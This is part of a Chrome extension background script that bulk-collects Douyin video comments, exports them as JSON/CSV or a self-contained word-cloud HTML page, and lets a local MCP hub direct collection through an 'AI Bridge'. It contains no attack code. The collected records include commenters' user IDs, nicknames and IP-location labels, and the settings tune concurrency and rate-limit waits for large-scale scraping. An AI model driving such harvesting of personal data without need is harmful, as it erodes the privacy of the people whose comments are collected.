HTML）会在加载本脚本前塞入\n  //   window.__CW_BOOT__ = { title, exportedAt, docs: [<导出 JSON 对象>, …] }\n  // 这里把它当成本地文件一样读进来，用户双击 HTML 就能看词云，不用再选文件。\n  function bootFromSnapshot() {\n    const boot = window.__CW_BOOT__;\n    if (!boot || !Array.isArray(boot.docs) || !boot.docs.length) return false;\n    let total = 0;\n    boot.docs.forEach((doc, i) => {\n      try {\n        const name = (doc && doc.__name) || `快照-${i + 1}.json`;\n        const n = ingestJson(JSON.stringify(doc), name);\n        if (n > 0) { total += n; state.sources.push(name); }\n      } catch (e) { console.warn('快照读取失败', e); }\n    });\n    if (!total) return false;\n    if (boot.title) document.title = boot.title;\n    updateScope();\n    updateEmptyState();\n    $('#btnClear').disabled = false;\n    refreshAll();\n    toast(`词云快照：${total} 条评论${boot.exportedAt ? '（导出于 ' + String(boot.exportedAt).slice(0, 16).replace('T', ' ') + '）' : ''}`);\n    return true;\n  }\n\n  function init() {\n    bindEvents();\n    renderWordList();\n    updateEmptyState();\n    updateScope();\n    // 快照优先：自带数据时不再走 ?data= 自动载入\n    if (bootFromSnapshot()) return console.log('%c评论分析台（快照模式）已就绪', 'color:#e0a94a;font-weight:600');\n\n    // 若页面地址带 ?data=<url 或 相对路径>，尝试自动载入（便于本地服务直接打开）\n    try {\n      const params = new URLSearchParams(location.search);\n      const auto = params.get('data');\n      if (auto) {\n        fetch(auto, { cache: 'no-store' }).then((r) => {\n          if (!r.ok) throw new Error('HTTP ' + r.status);\n          return r.text();\n        }).then((text) => {\n          const n = /\\.csv($|\\?)/i.test(auto) ? ingestCsv(text, auto.split('/').pop()) : ingestJson(text, auto.split('/').pop());\n          if (n > 0) {\n            state.sources.push(auto);\n            updateScope();\n            updateEmptyState();\n            $('#btnClear').disabled = false;\n            refreshAll();\n            toast(`自动载入 ${n} 条评论`);\n          }\n        }).catch((err) => {\n          console.warn('自动载入失败', err);\n          toast('自动载入失败：' + err.message + '（可手动选文件）');\n        });\n      }\n    } catch (e) { /* ignore */ }\n    console.log('%c评论分析台已就绪', 'color:#e0a94a;font-weight:600', '· 选择导出的 JSON/CSV 即可');\n  }\n\n  // 便于自动化测试 / 二次开发\n  window.CommentViewer = {\n    state,\n    loadFiles,\n    ingestJson,\n    ingestCsv,\n    filtered,\n    buildWords,\n    tokensOf,\n    profileOf,\n    videoUrl,\n    openDrawer,\n    closeDrawer,\n    renderTable,\n    refreshAll,\n  };\n\n  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);\n  else init();\n})();\n", // 词云页 app.js
};
/* === END VIEWER ASSETS === */

// ---------- 导出词云（v0.5.30） ----------
// 把选中的视频评论打包成一个**自包含 HTML**：词云页的 html/css/js 已内嵌在 VIEWER_ASSETS 里，
// 这里把评论数据塞进 window.__CW_BOOT__、替换掉 <link> 与 <script src> 两个标签。
// 下载下来是一个单文件，双击就能看词云；发给别人不用装扩展、不用起服务（纯前端，数据不出本机）。
function buildCloudHtml(docs, title) {
  const boot = { exportedAt: new Date().toISOString(), title: title || '评论词云快照', docs };
  const bootJson = JSON.stringify(boot).replace(/</g, '\\u003c');
  // 替换值必须写成函数：字符串替换里 `$$` 会被当成转义变成 `$`，
  // 而词云页 js 里到处是 `$$(sel)`，用字符串会把代码改坏。
  return VIEWER_ASSETS.html
    .replace('<link rel="stylesheet" href="styles.css">', () => '<style>\n' + VIEWER_ASSETS.css + '\n</style>')
    .replace('<script src="app.js"></script>', () => '<script>window.__CW_BOOT__=' + bootJson + ';</script>\n<script>\n' + VIEWER_ASSETS.js + '\n</script>')
    .replace('<title>', '<title>词云快照 · ');
}

async function exportCloud(opts) {
  const o = opts || {};
  const pickIds = Array.isArray(o.videoIds)
    ? Array.from(new Set(o.videoIds.map((x) => String(x || '').trim()).filter(Boolean)))
    : (o.videoId ? [String(o.videoId)] : []);
  if (!pickIds.length) {
    return { ok: false, error: 'MISSING_VIDEO_ID', hint: '导出词云需要选视频：面板里在「导出范围」选视频后点按钮；AI/MCP 用 cloud 命令传 videoId / videoIds / all:true' };
  }
  const allVideos = await getVideos();
  const docs = [];
  for (const v of pickIds) {
    const list = Object.values(await getComments(v));
    if (!list.length) continue;
    const meta = allVideos[v] || {};
    docs.push({
      __name: `douyin-comments-${v}.json`,
      videoId: v,
      title: meta.title || '',
      url: 'https://www.douyin.com/video/' + v,
      collectedAt: meta.collectedAt || '',
      count: list.length,
      comments: list,
    });
  }
  if (!docs.length) {
    return { ok: false, error: 'EMPTY_POOL', videoIds: pickIds, hint: '选中的视频本地都没有评论数据：先采集，再点「导出词云」' };
  }
  const total = docs.reduce((n, d) => n + d.count, 0);
  const title = docs.length === 1
    ? `词云 · ${docs[0].title || docs[0].videoId}`
    : `词云 · ${docs.length} 个视频`;
  const html = buildCloudHtml(docs, title);
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const tag = docs.length > 1 ? 'selected' + docs.length : docs[0].videoId;
  const dl = await download(html, `douyin-wordcloud-${tag}-${stamp}.html`, 'text/html;charset=utf-8');
  return Object.assign({
    count: total,
    videoCount: docs.length,
    videoIds: docs.map((d) => d.videoId),
    videos: docs.map((d) => ({ videoId: d.videoId, title: d.title, count: d.count }))
  }, dl);
}

// ---------- 消息路由 ----------

if (chrome && chrome.runtime && chrome.runtime.onMessage && chrome.runtime.onMessage.addListener) {
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (!msg || !msg.type) return;

  // 扩展后台可达性探针（内容脚本自测用；采集器会读这个结果判断要不要刷新页面自愈）。
  // 必须无副作用：早先用 dts-status 探活会给 dts_videos 写一条 videoId=undefined 的记录。
  if (msg.type === 'dts-ping') {
    sendResponse({ ok: true, pong: true, at: Date.now() });
    return false;
  }

  // AI Bridge 保活（协议 §7.5）：内容脚本周期 ping，不承载采集逻辑
  if (msg.type === 'dts-ai-keepalive') {
    sendResponse({ ok: true, keepalive: true, at: Date.now() });
    return false;
  }

  (async () => {
    try {
      switch (msg.type) {
        case 'dts-comments': {
          const n = await putComments(msg.videoId, msg.comments || [], {
            title: msg.title,
            total: msg.total,
            hasMore: msg.hasMore,
            signedUrlAt: msg.signedUrlAt
          });
          await setBadge(n);
          sendResponse({ ok: true, count: n });
          break;
        }

        case 'dts-status': {
          // 计数与写元数据放进同一个串行任务：否则读到的 count 可能是并发落库之前的旧值
          const n = await serial(async () => {
            const cnt = Object.keys(await getComments(msg.videoId)).length;
            await updateVideoMetaUnlocked(msg.videoId, { title: msg.title, phase: msg.phase, count: cnt });
            return cnt;
          });
          sendResponse({ ok: true, count: n });
          break;
        }

        case 'dts-stats': {
          const videos = await getVideos();
          const key = msg.videoId;
          let count = 0;
          if (key) count = Object.keys(await getComments(key)).length;
          // v0.2.9：面板要显示「本地已存 N 个视频 / M 条」，换视频后仍看得到旧数据还在。
          // totalAll 用 dts_videos 里维护的 count 元数据累加（每条 dts-comments 回包都会更新它），
          // 免得问一次统计就把几万条评论的所有桶都读一遍。
          const vkeys = Object.keys(videos);
          let totalAll = 0;
          for (const v of vkeys) totalAll += Number(videos[v] && videos[v].count) || 0;
          sendResponse({ ok: true, count, totalAll, videoCount: vkeys.length, videos });
          break;
        }

        case 'dts-export': {
          // 面板「导出」与 AI 桥 dts-ai-export 都走这里；范围/成败口径见 exportComments（与 Hub export 同一份）。
          sendResponse(await exportComments({ all: msg.all === true, videoId: msg.videoId, videoIds: msg.videoIds, format: msg.format }));
          break;
        }

        case 'dts-clear': {
          const videoId = msg.videoId;
          if (videoId) {
            await clearStorage(videoId);
          } else if (msg.all === true) {
            // 全清是高危操作，必须显式 all:true —— 空 videoId 绝不兜底成全清
            // （content.js 未识别到视频时以前会发空串，面板却提示"已清空本视频"）
            await clearStorage(null, true);
            aiLastLive = null;   // 数据全没了，「AI 最近一次活体」也没意义了（与 clear_storage 分支一致）
          } else {
            sendResponse({ ok: false, error: 'NO_VIDEO_ID', hint: '清空需要显式 videoId，或 all:true 全清' });
            break;
          }
          await setBadge(0);
          sendResponse({ ok: true });
          break;
        }

        // 导出词云（v0.5.30）：把选中的视频评论打成自包含 HTML 快照，双击即词云
        case 'dts-cloud': {
          sendResponse(await exportCloud({ videoIds: msg.videoIds, videoId: msg.videoId }));
          break;
        }

        default:
          sendResponse({ ok: false, error: 'unknown type: ' + msg.type });
      }
    } catch (e) {
      sendResponse({ ok: false, error: String((e && e.stack) || e) });
    }
  })();

  return true; // 异步响应
  });
}

if (chrome && chrome.runtime && chrome.runtime.onInstalled && chrome.runtime.onInstalled.addListener) {
  chrome.runtime.onInstalled.addListener(() => { setBadge(0).catch(() => {}); });
}

// ========================================================================
// AI Bridge（协议 §7，v0.2.0）
// 扩展不能 listen → 出站轮询本地 Hub（douyin-mcp）；命令再转发 content 或 storage。
// ========================================================================

const KEY_AI = 'dts_ai_bridge';
const AI_BRIDGE_DEFAULT = {
  host: '127.0.0.1',
  port: 18765,
  enabled: true,
  intervalMs: 800
};

// 桥接头：Hub 侧只判「存在」，值不重要 —— 它**不是**密码，而是一个「预检门槛」。
// 自定义头必然触发 CORS 预检，而 Hub 的预检只对 chrome-extension:// 放行，
// 所以浏览器里的网页发不出这个头（详见 douyin-mcp/mcp.js 顶部的「安全边界」）。
// 扩展侧零配置、用户无感知，即插即用不变。
const AI_BRIDGE_HEADERS = { 'X-DTS-Bridge': '1' };

let aiLastLive = null;          // 最近一次 content 状态快照
let aiLastCommandAt = 0;
let aiLastResultAt = 0;
let aiLastExtensionAt = 0;

async function getAiConfig() {
  try {
    const o = await chrome.storage.local.get(KEY_AI);
    return Object.assign({}, AI_BRIDGE_DEFAULT, o[KEY_AI] || {});
  } catch (e) {
    return Object.assign({}, AI_BRIDGE_DEFAULT);
  }
}

async function setAiConfig(patch) {
  const cur = await getAiConfig();
  const next = Object.assign({}, cur, patch || {});
  await chrome.storage.local.set({ [KEY_AI]: next });
  return next;
}

function aiBaseUrl(cfg) {
  return `http://${cfg.host}:${cfg.port}/api/v1`;
}

// ========================================================================
// 运行时设置（协议 §3.9）：AI（MCP / DSH 插件）通过桥命令下发采集参数。
//   dts_settings        ← 外部下发（本文件 set_settings / start_collect 的 settings，
//                          以及 DSH 插件每次调用推的那份）
//   dts_user_settings   ← 面板齿轮里用户当场设的（优先级更高）
//   dts_settings_effective ← content.js 每次「开始采集」把**实际生效值**写回来，供核对
// 优先级：内置常量 < dts_settings < dts_user_settings（逐字段判断，见 content.js
// loadRuntimeSettings）。所以 AI 设的值会被用户在面板里设过的同名项盖掉 —— 这是设计如此。
// ========================================================================
const KEY_RUNTIME_SETTINGS = 'dts_settings';
const KEY_USER_SETTINGS = 'dts_user_settings';
const KEY_EFFECTIVE_SETTINGS = 'dts_settings_effective';

// 与 content.js 的硬上限保持一致（改这里要同步改那边）
const SETTINGS_FIELDS = {
  maxCount: { min: 0, max: 1000000, desc: '目标条数，0=不限' },
  lanes: { min: 1, max: 8, desc: '顶层列表路数（v0.5.13 起生效：错峰多路，默认 3；1=单路）' },
  replyLanes: { min: 1, max: 8, desc: '二级回复并发路数' },
  replyGlobalGapMs: { min: 0, max: 2000, desc: '回复请求跨线程的全局最小间隔 ms（0=用扩展内置 250ms）' },
  replyGapMs: { min: 0, max: 60000, desc: '回复同线程请求间隔 ms' },
  replyWarmupMs: { min: 0, max: 600000, desc: '进补采前的静默 ms' },
  replyThrottleMaxWaitMs: { min: 10000, max: 600000, desc: '整段等限流窗口的墙钟上限 ms' }
};

function clampSettings(input, base) {
  const out = Object.assign({}, base || {});
  const unknown = [];
  if (!input || typeof input !== 'object') return { settings: {}, unknown };
  for (const k of Object.keys(input)) {
    const spec = SETTINGS_FIELDS[k];
    if (!spec) { unknown.push(k); continue; }
    const n = Number(input[k]);
    if (!isFinite(n)) { unknown.push(k); continue; }
    out[k] = Math.max(spec.min, Math.min(Math.round(n), spec.max));
  }
  return { settings: out, unknown };
}

async function readSettingsSnapshot() {
  const o = await chrome.storage.local.get([KEY_RUNTIME_SETTINGS, KEY_USER_SETTINGS, KEY_EFFECTIVE_SETTINGS]);
  return {
    external: o[KEY_RUNTIME_SETTINGS] || null,
    user: o[KEY_USER_SETTINGS] || null,
    effective: o[KEY_EFFECTIVE_SETTINGS] || null,
    precedence: '内置常量 < dts_settings（AI 下发） < dts_user_settings（面板齿轮）',
    limits: SETTINGS_FIELDS
  };
}

async function findDouyinTabs() {
  try {
    return await chrome.tabs.query({
      url: ['*://*.douyin.com/*', '*://*.iesdouyin.com/*']
    });
  } catch (e) {
    return [];
  }
}

function pickDouyinTab(tabs) {
  if (!tabs || !tabs.length) return null;
  const active = tabs.filter((t) => t.active);
  const pool = active.length ? active : tabs;
  pool.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
  return pool[0] || null;
}

async function sendToDouyinTab(msg) {
  const tabs = await findDouyinTabs();
  const tab = pickDouyinTab(tabs);
  if (!tab) {
    return {
      ok: false,
      error: 'NO_DOUYIN_TAB',
      hint: '请先在 Chrome 打开抖音页面（www.douyin.com，已登录），再调用页面类 AI 命令。'
    };
  }
  try {
    const resp = await chrome.tabs.sendMessage(tab.id, msg);
    if (resp && resp.ok && resp.status) aiLastLive = resp.status;
    return Object.assign({ tabId: tab.id, tabUrl: tab.url }, resp || { ok: true });
  } catch (e) {
    return {
      ok: false,
      error: String((e && e.message) || e),
      tabId: tab.id,
      tabUrl: tab.url,
      hint: '抖音页扩展内容脚本未就绪：请在该标签页按 F5 刷新，确认扩展已加载且已登录。'
    };
  }
}

function summarizeComments(list) {
  const arr = (list || []).filter(Boolean);
  const top = arr.filter((c) => !c.is_reply);
  const replies = arr.filter((c) => c.is_reply);
  const diggs = arr.map((c) => Number(c.digg_count) || 0).sort((a, b) => a - b);
  const pick = (p) => {
    if (!diggs.length) return 0;
    const i = Math.min(diggs.length - 1, Math.floor((diggs.length - 1) * p));
    return diggs[i];
  };
  const textLen = arr.map((c) => [...String(c.text || '')].length);
  return {
    count: arr.length,
    topLevelCount: top.length,
    replyCount: replies.length,
    digg: {
      min: diggs[0] || 0,
      p25: pick(0.25),
      p50: pick(0.5),
      p75: pick(0.75),
      p90: pick(0.9),
      max: diggs[diggs.length - 1] || 0
    },
    avgTextLen: textLen.length
      ? Math.round((textLen.reduce((a, b) => a + b, 0) / textLen.length) * 10) / 10
      : 0,
    hotCount: arr.filter((c) => c.is_hot).length,
    foldedCount: arr.filter((c) => c.is_folded).length
  };
}

function pickCommentFields(c, fields) {
  if (!c) return c;
  const base = fields && fields.length
    ? fields
    : ['cid', 'text', 'create_time', 'create_time_str', 'digg_count', 'reply_comment_total',
       'ip_label', 'is_hot', 'is_folded', 'level', 'stick_position', 'is_reply', 'parent_cid',
       'user'];
  const out = {};
  for (const k of base) {
    if (k === 'user') {
      const u = c.user || {};
      out.user = {
        uid: u.uid,
        nickname: u.nickname,
        sec_uid: u.sec_uid,
        unique_id: u.unique_id,
        short_id: u.short_id,
        avatar_thumb: u.avatar_thumb
      };
    } else {
      out[k] = c[k];
    }
  }
  return out;
}

async function executeAiCommand(cmd) {
  const type = cmd.type;
  const args = cmd.args || {};
  aiLastCommandAt = Date.now();

  switch (type) {
    case 'status': {
      const videos = await getVideos();
      let count = 0;
      if (args.videoId) {
        count = Object.keys(await getComments(args.videoId)).length;
      } else {
        for (const v of Object.keys(videos)) {
          count += Object.keys(await getComments(v)).length;
        }
      }
      const tabs = await findDouyinTabs();
      return {
        ok: true,
        result: {
          storage: { videos, count, videoCount: Object.keys(videos).length },
          settings: await readSettingsSnapshot(),
          live: aiLastLive,
          tabs: tabs.map((t) => ({ id: t.id, title: t.title, url: t.url, active: !!t.active })),
          bridge: {
            lastCommandAt: aiLastCommandAt,
            lastResultAt: aiLastResultAt,
            lastExtensionAt: aiLastExtensionAt
          }
        }
      };
    }

    case 'live_status':
      return sendToDouyinTab({ type: 'dts-ai-live-status' });

    case 'start_collect': {
      // 可选：本次开始采集要用的参数（协议 §3.9）。写进 dts_settings 后内容脚本
      // 在 startLoop() 里会重读一次 —— 与 DSH 插件同一条通路，改完立即生效。
      let appliedSettings = null;
      if (args.settings && typeof args.settings === 'object') {
        const cur = (await chrome.storage.local.get(KEY_RUNTIME_SETTINGS))[KEY_RUNTIME_SETTINGS] || {};
        const c = clampSettings(args.settings, cur);
        if (Object.keys(c.settings).length) {
          await chrome.storage.local.set({ [KEY_RUNTIME_SETTINGS]: c.settings });
          appliedSettings = c.settings;
        }
      }
      const r = await sendToDouyinTab({ type: 'dts-ai-start' });
      if (r.ok && r.status && r.status.phase === 'waiting-sign' && !r.status.liveVideoId) {
        r.hint = r.status.hint || '当前页还没识别到视频：请先点开一条具体视频（网格页需点开作品浮层）。';
      }
      if (appliedSettings) {
        r.appliedSettings = appliedSettings;
        r.settingsNote = '参数已写进 dts_settings，本次采集生效；面板齿轮里用户设过的同名项优先级更高。';
      }
      return r;
    }

    case 'pause_collect':
      return sendToDouyinTab({ type: 'dts-ai-pause' });

    case 'clear_page':
      return sendToDouyinTab({ type: 'dts-ai-clear-page' });

    case 'list_videos': {
      const videos = await getVideos();
      return {
        ok: true,
        result: {
          videos,
          count: Object.keys(videos).length
        }
      };
    }

    case 'get_comments': {
      const videoId = args.videoId;
      if (!videoId) return { ok: false, error: 'MISSING_VIDEO_ID', hint: 'get_comments 需要 videoId 参数' };
      const map = await getComments(videoId);
      let list = Object.values(map);
      list.sort((a, b) => (a.create_time || 0) - (b.create_time || 0));
      const mode = args.mode === 'page' ? 'page' : 'summary';
      const limit = Math.max(1, Math.min(Number(args.limit) || 200, 2000));
      const offset = Math.max(0, Number(args.offset) || 0);
      const videos = await getVideos();
      const meta = videos[videoId] || { videoId };

      if (mode === 'summary') {
        const sample = list.slice(0, Math.min(limit, 50)).map((c) => pickCommentFields(c, args.fields));
        return {
          ok: true,
          result: {
            mode,
            videoId,
            meta,
            summary: summarizeComments(list),
            sample,
            hasMore: list.length > sample.length,
            fullCount: list.length
          }
        };
      }

      const page = list.slice(offset, offset + limit).map((c) => pickCommentFields(c, args.fields));
      return {
        ok: true,
        result: {
          mode,
          videoId,
          meta,
          offset,
          limit,
          returned: page.length,
          fullCount: list.length,
          summary: summarizeComments(list),
          comments: page
        }
      };
    }

    case 'export': {
      // v0.5.9：与面板「导出」同一份实现（exportComments）。
      // args.all === true 时不传 videoId 也能导：把本地所有视频的评论合成一份，
      // CSV 末尾追加 video_id 列。成功按 Hub 约定把主体放进 result（scope / videoCount /
      // count / replyCount / filename / bytes / path），失败保持顶层 error+hint
      // （MISSING_VIDEO_ID / EMPTY_POOL），MCP 才能原样透给模型。
      const r = await exportComments({ all: args.all === true, videoId: args.videoId, videoIds: args.videoIds, format: args.format });
      if (!r.ok) return r;
      return { ok: true, result: r };
    }

    case 'cloud': {
      // v0.5.38：AI/MCP 也能导词云 HTML（原来只有面板「导出词云」按钮能导）。
      // 与面板同一条实现（exportCloud）：传 videoId / videoIds 指定视频，all:true = 本地全部视频。
      let ids = [];
      if (args.all === true) {
        ids = Object.keys(await getVideos());
      } else if (Array.isArray(args.videoIds) && args.videoIds.length) {
        ids = args.videoIds;
      } else if (args.videoId) {
        ids = [String(args.videoId)];
      }
      if (!ids.length) {
        return {
          ok: false,
          error: 'MISSING_VIDEO_ID',
          hint: 'cloud 需要视频：传 videoId / videoIds:[...]，或用 all:true 导本地全部视频'
        };
      }
      const r = await exportCloud({ videoIds: ids });
      if (!r.ok) return r;
      return { ok: true, result: r };
    }

    case 'clear_storage': {
      // 与面板「全部清空」同一条口径：只有显式 all===true 才全清。
      // 以前是「没有 videoId 就全清」—— 模型传错/漏传一个参数就把所有视频的数据删了。
      const videoId = args.videoId ? String(args.videoId) : '';
      if (!videoId && args.all !== true) {
        return {
          ok: false,
          error: 'MISSING_VIDEO_ID',
          hint: 'clear_storage 需要 videoId；要清空**全部**本地数据请显式传 all:true（不可恢复）'
        };
      }
      await clearStorage(videoId || null, !videoId);
      if (!videoId) aiLastLive = null;
      await setBadge(0);
      return { ok: true, result: { cleared: videoId || 'ALL' } };
    }

    case 'get_settings':
      return { ok: true, result: await readSettingsSnapshot() };

    case 'set_settings': {
      // args.clear = 'external' | 'user' | 'all' → 删掉对应键（恢复内置/插件值）
      if (args.clear) {
        const which = String(args.clear);
        const keys = which === 'all'
          ? [KEY_RUNTIME_SETTINGS, KEY_USER_SETTINGS]
          : which === 'user'
            ? [KEY_USER_SETTINGS]
            : [KEY_RUNTIME_SETTINGS];
        await chrome.storage.local.remove(keys);
        return { ok: true, result: { cleared: which, clearedKeys: keys, settings: await readSettingsSnapshot() } };
      }
      const scope = args.scope === 'panel' ? 'panel' : 'external';
      const key = scope === 'panel' ? KEY_USER_SETTINGS : KEY_RUNTIME_SETTINGS;
      const cur = (await chrome.storage.local.get(key))[key] || {};
      const c = clampSettings(args.settings, cur);
      if (!Object.keys(c.settings).length) {
        return {
          ok: false,
          error: 'NO_SETTINGS',
          hint: '请传 settings：{ maxCount, lanes, replyLanes, replyGapMs, replyWarmupMs, replyThrottleMaxWaitMs }；'
            + '或传 clear:"external"|"user"|"all" 恢复默认。'
        };
      }
      await chrome.storage.local.set({ [key]: c.settings });
      return {
        ok: true,
        result: {
          scope,
          key,
          settings: c.settings,
          unknown: c.unknown.length ? c.unknown : undefined,
          note: '内容脚本每次「开始采集」都会重读，改完立即生效；面板齿轮里用户设过的同名项优先级更高。'
        }
      };
    }

    case 'set_bridge_config': {
      const next = await setAiConfig(args || {});
      // intervalMs / host / port 变更立即重建轮询定时器（否则改配置不生效）
      ensureAiPoller().catch(() => {});
      return { ok: true, result: { config: next } };
    }

    default:
      return { ok: false, error: 'UNKNOWN_COMMAND:' + type, hint: '未知 AI 命令类型' };
  }
}

async function aiPollOnce() {
  const cfg = await getAiConfig();
  if (!cfg.enabled) return;
  const base = aiBaseUrl(cfg);
  let commands = [];
  try {
    // host_permissions 已含 127.0.0.1，扩展 fetch 通常不受 CORS 约束；
    // X-DTS-Bridge 是给 Hub 的「预检门槛」（见 mcp.js 顶部的安全边界说明）。
    const res = await fetch(base + '/pending', {
      method: 'GET',
      headers: AI_BRIDGE_HEADERS,
      cache: 'no-store',
      credentials: 'omit',
      mode: 'cors'
    });
    if (!res.ok) return;
    const data = await res.json();
    commands = (data && data.commands) || [];
    aiLastExtensionAt = Date.now();
  } catch (e) {
    // Hub 未启动 / CORS / 网络：静默，不影响面板采集（协议 §7.8）
    return;
  }

  if (!commands.length) return;

  for (const cmd of commands) {
    let out;
    try {
      out = await executeAiCommand(cmd);
    } catch (e) {
      out = { ok: false, error: String((e && e.stack) || e) };
    }
    const body = {
      id: cmd.id,
      type: cmd.type,
      ok: !!out.ok,
      result: out.result !== undefined ? out.result : (out.ok ? out : undefined),
      error: out.error || undefined,
      hint: out.hint || undefined,
      videoId: out.videoId || undefined,
      status: out.status || undefined,
      filename: out.filename || undefined,
      bytes: out.bytes || undefined,
      path: out.path || undefined,
      tabId: out.tabId,
      at: Date.now()
    };
    // 统一拍平：ok 分支把扩展回包主体放进 result（Hub/MCP 更好消费）
    if (out.ok && out.result === undefined && out.status !== undefined) {
      body.result = { status: out.status, tabId: out.tabId, tabUrl: out.tabUrl };
      // start_collect 带参数时要把「本次实际写进去的设置」透出来（否则这里会被拍平丢掉）
      if (out.appliedSettings) {
        body.result.appliedSettings = out.appliedSettings;
        body.result.settingsNote = out.settingsNote;
      }
    } else if (out.ok && out.result === undefined && out.filename !== undefined) {
      body.result = {
        ok: true,
        videoId: out.videoId,
        format: out.format,
        filename: out.filename,
        bytes: out.bytes,
        path: out.path,
        downloadId: out.downloadId
      };
    } else if (out.ok && out.result === undefined) {
      body.result = out;
    }
    try {
      await fetch(base + '/result', {
        method: 'POST',
        headers: Object.assign({ 'Content-Type': 'application/json' }, AI_BRIDGE_HEADERS),
        body: JSON.stringify(body),
        credentials: 'omit',
        mode: 'cors'
      });
      aiLastResultAt = body.at;
    } catch (e) { /* Hub 刚关：结果丢失可重发，不在扩展侧持久化队列 */ }
  }
}

let aiTimer = null;
let aiTimerInterval = 0;   // 当前定时器实际使用的间隔；set_bridge_config 改了 intervalMs 要重建

async function ensureAiPoller() {
  const cfg = await getAiConfig();
  const want = Math.max(200, Number(cfg.intervalMs) || AI_BRIDGE_DEFAULT.intervalMs);
  if (aiTimer && aiTimerInterval === want) return;
  if (aiTimer) { clearInterval(aiTimer); aiTimer = null; }
  const tick = () => {
    try {
      aiPollOnce().catch(() => {});
    } catch (e) { /* poll 内部已兜 */ }
  };
  // 不用 chrome.alarms：权限缺失或 SW 缓存会导致 onAlarm TypeError / 注册失败。
  // setInterval + content keepalive 足够；Hub 不在时静默失败。
  aiTimerInterval = want;
  aiTimer = setInterval(tick, want);
  tick();
}

ensureAiPoller();

if (chrome && chrome.runtime && chrome.runtime.onStartup && chrome.runtime.onStartup.addListener) {
  chrome.runtime.onStartup.addListener(() => { ensureAiPoller(); });
}
if (chrome && chrome.runtime && chrome.runtime.onInstalled && chrome.runtime.onInstalled.addListener) {
  chrome.runtime.onInstalled.addListener(() => { ensureAiPoller(); });
}

